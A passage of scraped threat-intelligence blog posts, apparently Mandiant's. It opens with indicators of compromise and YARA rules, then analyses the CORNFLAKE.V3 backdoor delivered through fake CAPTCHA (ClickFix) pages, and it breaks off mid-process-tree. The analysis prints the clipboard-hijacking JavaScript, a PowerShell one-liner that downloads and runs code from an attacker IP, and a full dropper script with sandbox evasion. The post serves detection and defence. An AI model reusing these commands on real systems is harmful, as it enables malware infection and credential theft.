baseline;\">https[:]//mediareleaseupdates[.]com/20250509[.]bmp</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Hosting IP</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">103.79.120[.]72</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">C2 IP</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">166.88.2[.]90</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">SOGU.SEC User Agent</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 10.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><h4>Host Indicators</h4></div>\n<div class=\"block-paragraph_advanced\"><div align=\"center\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table><colgroup><col /><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Name</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">IOC</strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Mutex Name</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">KNbgxngdS</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">RC4 Key</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">mqHKVbHWWAJwrLXD</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Registry Key</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\CanonPrinter=\"%APPDATA%\\cnmpaui.exe\" 9 780</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">File Path</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">%LOCALAPPDATA%\\DNVjzaXMFO\\</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">File Path</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">C:\\Users\\Public\\Intelnet\\</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">File Path</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">C:\\Users\\Public\\SecurityScan\\</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><h3>YARA Rules</h3></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>rule G_Downloader_STATICPLUGIN_1 {\n    meta:\n        author = \"GTIG\"\n        date_created = \"2025-07-24\"\n        date_modified = \"2025-07-24\"\n        description = \"STATICPLUGIN is a downloader observed to retrieve an MSI packaged payload from a hard-coded C2 domain.\"\n        md5 = \"52f42a40d24e1d62d1ed29b28778fc45\"\n        rev = 1    \n    strings:\n        $s1 = \"InstallRemoteMSI\"\n        $s2 = \"InstallUpdate\"\n        $s3 = \"Button1Click\"\n        $s4 = \"Button2Click\"\n        $s5 = \"WindowsInstaller.Installer\" wide\n    condition:\n        uint16(0)==0x5a4d and all of them\n}</code></pre></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>rule G_Launcher_CANONSTAGER_1 {\n    meta:\n        author = \"GTIG\"\n        date_created = \"2025-07-25\"\n        date_modified = \"2025-07-25\"\n        description = \"CANONSTAGER is a side-loaded DLL launcher used to decrypt and execute a payload in-memory.\"\n        md5 = \"fa71d60e43da381ad656192a41e38724\"\n        rev = 1\n    strings:\n        $str1 = \".dat\" wide\n        $str2 = \"\\\\cnmplog\" wide\t\t\n        $code1 = {43 0F B6 ?? 0F B6 [3]00 D0 0F B6 ?? 8A 74 [2]88 74 [2]88 54 [2]8B 7? [2]02 54 [2]0F B6 ?? 0F B6 [3]32 14 ?? [0-4] 88 14 ?? 41 39 ?? 75 C? }\t\t\n        $code2 = {0F B6 [3] 89 ?? 83 E? 0F 00 D0 02 ?? [1-2] 0F B6 ?? 8A 74 [2] 88 74 [2] 4? 88 54 [2]81 F? 00 01 00 00 75 D?}\n        $code3 = {40 89 ?? 0F B6 C0 0F B6 [3]00 D9 88 9? [4-5]0F B6 F? 8A 7C 3? ?? 88 7C 0? ?? 88 5C 3? ?? 02 5C 0? ?? 0F B6 F? 0F B6 5C 3? ?? [0-2]8B [3]32 1C ?? [7-8]42 [0-2]39 D? 75 BC }\n    condition:\n        all of ($str*) and 2 of ($code*)\n}</code></pre></div>"}
{"source": "Threat Intelligence", "title": "A Cereal Offender: Analyzing the CORNFLAKE.V3 Backdoor", "link": "https://cloud.google.com/blog/topics/threat-intelligence/analyzing-cornflake-v3-backdoor/", "published": "Wed, 20 Aug 2025 14:00:00 +0000", "summary": "<div class=\"block-paragraph_advanced\"><p>Written by: Marco Galli</p>\n<hr /></div>\n<div class=\"block-paragraph_advanced\"><h3 style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">Welcome to the Frontline Bulletin Series</span></h3>\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">Straight from </span><a href=\"https://cloud.google.com/security/products/mandiant-managed-threat-hunting\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Mandiant Threat Defense</span></a><span style=\"vertical-align: baseline;\">, the \"Frontline Bulletin\" series brings you the latest on the most intriguing compromises we are seeing in the wild right now, equipping our community to understand and respond to the most compelling threats we observe. This edition dissects an infection involving two threat groups, UNC5518 and UNC5774, leading to the deployment of CORNFLAKE.V3.</span></p>\n<h3 style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">Introduction</span></h3>\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">Since June 2024, Mandiant Threat Defense has been tracking UNC5518, a financially motivated threat cluster compromising legitimate websites to serve fake CAPTCHA verification pages. This deceptive technique, known as </span><code style=\"vertical-align: baseline;\">ClickFix</code><span style=\"vertical-align: baseline;\">, lures website visitors into executing a downloader script which initiates a malware infection chain. UNC5518 appears to partner with clients or affiliates who use access obtained by the group to deploy additional malware.</span></p>\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">While the initial compromise and fake CAPTCHA deployment are orchestrated by UNC5518, the payloads served belong to other threat groups. UNC5518 utilizes downloader scripts that function as an access-as-a-service. Several distinct threat actors have been observed leveraging the access provided by UNC5518, including:</span></p>\n<ul style=\"text-align: left;\">\n<li style=\"vertical-align: baseline;\">\n<p style=\"text-align: justify;\"><span style=\"vertical-align: baseline;\">UNC5774: A financially motivated group known to use CORNFLAKE backdoor to deploy a variety of subsequent payloads.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p style=\"text-align: justify;\"><span style=\"vertical-align: baseline;\">UNC4108: A threat cluster with unknown motivation, observed using PowerShell to deploy various tools like VOLTMARKER and NetSupport RAT, and conducting reconnaissance.</span></p>\n</li>\n</ul>\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">This blog post details a campaign where Mandiant identified UNC5518 deploying a downloader that delivers CORNFLAKE.V3 malware. Mandiant attributes the CORNFLAKE.V3 samples to UNC5774, a distinct financially motivated actor that uses UNC5518's access-as-a-service operation as an entry vector into target environments.</span></p>\n<h3 style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">The CORNFLAKE Family</span></h3>\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">CORNFLAKE.V3 is a backdoor, observed as two variants, written in JavaScript or PHP (PHP Variant</span><span style=\"vertical-align: baseline;\">) that retrieves payloads via HTTP. Supported payload types include shell commands, executables and dynamic link libraries (DLLs). Downloaded payloads are written to disk and executed. CORNFLAKE.V3 collects basic system information and sends it to a remote server via HTTP. CORNFLAKE.V3 has also been observed abusing Cloudflare Tunnels to proxy traffic to remote servers.</span></p>\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">CORNFLAKE.V3 is an updated version of CORNFLAKE.V2, sharing a significant portion of its codebase. Unlike V2, which functioned solely as a downloader, V3 features host persistence via a registry Run key, and supports additional payload types.</span></p>\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">The original CORNFLAKE malware differed significantly from later iterations, as it was written in C. This first variant functioned as a downloader, gathering basic system information and transmitting it via TCP to a remote server. Subsequently, it would download and execute a payload.</span></p></div>\n<div class=\"block-paragraph_advanced\"><div align=\"left\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table><colgroup><col /><col /><col /><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Malware Family</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">CORNFLAKE</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">CORNFLAKE.V2</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">CORNFLAKE.V3</strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Language</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">C</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">JS</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">JS or PHP</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Type</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Downloader</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Downloader</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Backdoor</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">C2 Communication</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">TCP socket (XOR encoded)</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">HTTP (XOR encoded)</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">HTTP (XOR encoded)</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Payload types</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">DLL</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">DLL,EXE,JS,BAT</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">DLL,EXE,JS,BAT,PS</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">Persistence</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">No</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">No</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Registry Run key</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n<div style=\"color: #5f6368; overflow: auto hidden; width: 100%; text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\">Table 1: Comparison of CORNFLAKE malware variants</span></div>\n</div></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"The observed CORNFLAKE.V3 (Node.js) attack lifecycle\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/cornflake-fig1.max-1000x1000.jpg\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 1: The observed CORNFLAKE.V3 (Node.js) attack lifecycle</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3 style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">Initial Lead</span></h3>\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">Mandiant Threat Defense responded to suspicious PowerShell activity on a host resulting in the deployment of the CORNFLAKE.V3 backdoor.</span></p>\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">Mandiant observed that a PowerShell script was executed via the Run command using the </span><code style=\"vertical-align: baseline;\">Windows+R</code> <span style=\"vertical-align: baseline;\">shortcut. Evidence of this activity was found in the </span><code style=\"vertical-align: baseline;\">HKEY_USERS\\User\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU</code><span style=\"vertical-align: baseline;\"> registry key, containing the following entry which resulted in the download and execution of the next payload:</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>Name: a\nValue: powershell -w h -c \n\"$u=[int64](([datetime]::UtcNow-[datetime]'1970-1-1').TotalSeconds)-band \n0xfffffffffffffff0;irm 138.199.161[.]141:8080/$u|iex\"\\1</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">The </span><code style=\"vertical-align: baseline;\">RunMRU</code> <span style=\"vertical-align: baseline;\">registry key stores the history of commands entered into the Windows </span><code style=\"vertical-align: baseline;\">Run</code><span style=\"vertical-align: baseline;\"> (shortcut </span><code style=\"vertical-align: baseline;\">Windows+R</code><span style=\"vertical-align: baseline;\">) dialog box.</span></p>\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">The execution of malicious scripts using the </span><code style=\"vertical-align: baseline;\">Windows+R</code><span style=\"vertical-align: baseline;\"> shortcut is often indicative of users who have fallen victim to ClickFix lure pages. Users typically land on such pages as a result of benign browsing leading to interaction with search results that employ SEO poisoning or malicious ads.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Fake CAPTCHA verification (ClickFix) on an attacker-controlled webpage\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/cornflake-fig2.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 2: Fake CAPTCHA verification (ClickFix) on an attacker-controlled webpage</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">As seen in the Figure 2, the user was lured into pasting a hidden script into the Windows Run dialog box which was automatically copied to the clipboard by the malicious web page when the user clicked on the image. The webpage accomplished this with the following JavaScript code:</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>// An image with the reCAPTCHA logo is displayed on the webpage\n&lt;div class=\"c\" id=\"j\"&gt;\n  &lt;img src=\"https://www.gstatic[.]com/recaptcha/api2/logo_48.png\" \nalt=\"reCAPTCHA Logo\"&gt;\n  &lt;span&gt;I'm not a robot&lt;/span&gt;\n&lt;/div&gt;\n\n// The malicious script is saved in variable _0xC\nvar _0xC = \"powershell -w h -c \n\"$u=[int64](([datetime]::UtcNow-[datetime]'1970-1-1').TotalSeconds)-band \n0xfffffffffffffff0;irm 138.199.161[.]141:8080/$u|iex\"\\1\";\n\n// When the image is clicked, the script is copied to the clipboard\ndocument.getElementById(\"j\").onclick = function(){ \nvar ta = document.createElement(\"textarea\");\nta.value = _0xC;\ndocument.body.appendChild(ta);\nta.select();\ndocument.execCommand(\"copy\");</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">The PowerShell command copied to clipboard is designed to download and execute a script from the remote server </span><code style=\"vertical-align: baseline;\">138.199.161[.]141:8080/$u</code><span style=\"vertical-align: baseline;\">, where </span><code style=\"vertical-align: baseline;\">$u</code><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">indicates the UNIX epoch timestamp of the download.</span></p>\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">As a result, the PowerShell process connects to the aforementioned IP address and port with URL path </span><code style=\"vertical-align: baseline;\">1742214432</code> <span style=\"vertical-align: baseline;\">(UNIX epoch timestamp), as shown in the following HTTP GET request:</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>GET /1742214432 HTTP/1.1\nUser-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) \nWindowsPowerShell/5.1.19041.5486\nHost: 138.199.161[.\\]141:8080\nConnection: Keep-Alive</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The following PowerShell dropper script, similar to </span><code style=\"vertical-align: baseline;\">1742214432</code><span style=\"vertical-align: baseline;\">,</span><span style=\"vertical-align: baseline;\"> was recovered from a threat-actor controlled server during the investigation of a similar CORNFLAKE.V3 compromise:</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code># Get computer manufacturer for evasion check.\n$Manufacturer = Get-WmiObject Win32_ComputerSystem | Select-Object \n-ExpandProperty Manufacturer\n# Exit if running in QEMU (VM detection).\nif ($Manufacturer -eq \"QEMU\") {\n    exit 0;\n}\n\n# Get memory info for evasion check.\n$TotalMemoryGb = \n(Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB\n$AvailableMemoryGb = \n(Get-CimInstance Win32_OperatingSystem).FreePhysicalMemory / 1MB \n$UsedMemoryGb = $TotalMemoryGb - $AvailableMemoryGb \n# Exit if total memory is low or calculated \"used\" memory is low \n(possible sandbox detection).\nif ($TotalMemoryGb -lt 4 -or $UsedMemoryGb -lt 1.5) {\n    exit 0\n}\n# Exit if computer name matches default pattern \n(possible sandbox detection).\nif ($env:COMPUTERNAME -match \"DESKTOP-S*\") {\n    exit 0\n}\n\n# Pause execution briefly.\nsleep 1\n\n# Define download URL (defanged).\n$ZipURL = \"hxxps://nodejs[.]org/dist/v22.11.0/node-v22.11.0-win-x64.zip\"\n# Define destination folder (AppData).\n$DestinationFolder = [System.IO.Path]::Combine($env:APPDATA, \"\")\n# Define temporary file path for download.\n$ZipFile = [System.IO.Path]::Combine($env:TEMP, \"downloaded.zip\")\n\n# Download the Node.js zip file.\niwr -Uri $ZipURL -OutFile $ZipFile\n\n# Try block for file extraction using COM objects.\ntry {\n\t$Shell = New-Object -ComObject Shell.Application\n\t$ZIP = $Shell.NameSpace($ZipFile)\n\t$Destination = $Shell.NameSpace($DestinationFolder)\n\t# Copy/extract contents silently.\n\t$Destination.CopyHere($ZIP.Items(), 20)\n}\n# Exit on any extraction error.\ncatch {\n\texit 0\n}\n\n# Update destination path to the extracted Node.js folder.\n$DestinationFolder = [System.IO.Path]::Combine($DestinationFolder, \n\"node-v22.11.0-win-x64\")\n# Base64 encoded payload (large blob containing the CORNFLAKE.V3 sample).\n$BASE64STRING =&lt;Base-64 encoded CORNFLAKE.V3 sample&gt;\n# Decode the Base64 string.\n$BINARYDATA = [Convert]::FromBase64String($BASE64STRING)\n# Convert decoded bytes to a string (the payload code).\n$StringData = [System.Text.Encoding]::UTF8.GetString($BINARYDATA)\n# Path to the extracted node.exe.\n$Node = [System.IO.Path]::Combine($DestinationFolder, \"node.exe\")\n\n# Start node.exe to execute the decoded string data as JavaScript, hidden.\nstart-process -FilePath \"$Node\" -ArgumentList \"-e `\"$StringData`\"\" \n-WindowStyle Hidden</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">The PowerShell dropper’s execution includes multiple steps:</span></p>\n<ul style=\"text-align: left;\">\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Check if it is running inside a virtual machine and, if true, exit</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Download Node.js via HTTPS from the URL </span><code style=\"vertical-align: baseline;\">hxxps://nodejs[.]org/dist/v22.11.0/node-v22.11.0-win-x64.zip</code><span style=\"vertical-align: baseline;\">, write the file to </span><code style=\"vertical-align: baseline;\">%TEMP%\\downloaded.zip</code><span style=\"vertical-align: baseline;\"> and extract its contents to the directory </span><code style=\"vertical-align: baseline;\">%APPDATA%\\node-v22.11.0-win-x64</code></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Base64 decode its embedded CORNFLAKE.V3 payload and execute it via the command </span><code style=\"vertical-align: baseline;\">%APPDATA%\\node-v22.11.0-win-x64\\node.exe -e “&lt;base64_decoded_CORNFLAKE.v3&gt;”</code></p>\n</li>\n</ul>\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">The PowerShell dropper's anti-vm checks include checking for low system resources (total memory less than 4GB or used memory less than 1.5GB) and if the target system's computer name matches the regular expression </span><code style=\"vertical-align: baseline;\">DESKTOP-S*</code><span style=\"vertical-align: baseline;\"> or the target system's manufacturer is </span><code style=\"vertical-align: baseline;\">QEMU</code><span style=\"vertical-align: baseline;\">.</span></p>\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">As a result of the dropper’s execution, a DNS query for the </span><code style=\"vertical-align: baseline;\">nodejs[.]org</code><span style=\"vertical-align: baseline;\"> domain was made, followed by the download of an archive named </span><code style=\"vertical-align: baseline;\">downloaded.zip</code> (<span style=\"vertical-align: baseline;\">SHA256:</span> <code>905373a059aecaf7f48c1ce10ffbd5334457ca00f678747f19db5ea7d256c236</code>)<span style=\"vertical-align: baseline;\">. This archive contained the Node.js runtime environment, including its executable file </span><code style=\"vertical-align: baseline;\">node.exe</code><span style=\"vertical-align: baseline;\">, which was then extracted to </span><code style=\"vertical-align: baseline;\">%APPDATA%\\node-v22.11.0-win-x64\\</code><span style=\"vertical-align: baseline;\">. The Node.js environment allows for the execution of JavaScript code outside of a web browser.</span></p>\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">The extracted </span><code style=\"vertical-align: baseline;\">%APPDATA%\\node-v22.11.0-win-x64\\node.exe</code><span style=\"vertical-align: baseline;\"> binary was then launched by Powershell with the </span><code style=\"vertical-align: baseline;\">-e</code><span style=\"vertical-align: baseline;\"> argument, followed by a large Node.js script, a CORNFLAKE.V3 backdoor sample.</span></p>\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">Mandiant identified the following activities originating from the CORNFLAKE.V3 sample:</span></p>\n<ul style=\"text-align: left;\">\n<li style=\"vertical-align: baseline;\">\n<p style=\"text-align: justify;\"><span style=\"vertical-align: baseline;\">Host and AD-based reconnaissance</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p style=\"text-align: justify;\"><span style=\"vertical-align: baseline;\">Persistence via Registry Run key</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p style=\"text-align: justify;\"><span style=\"vertical-align: baseline;\">Credential harvesting attempts via Kerberoasting</span></p>\n</li>\n</ul>\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">The following process tree was observed during the investigation:</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>explorer.exe \n     ↳ c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe \n-w h -c \n\"$u=[int64](([datetime]::UtcNow-[datetime]'1970-1-1').TotalSeconds)-band \n0xfffffffffffffff0;irm 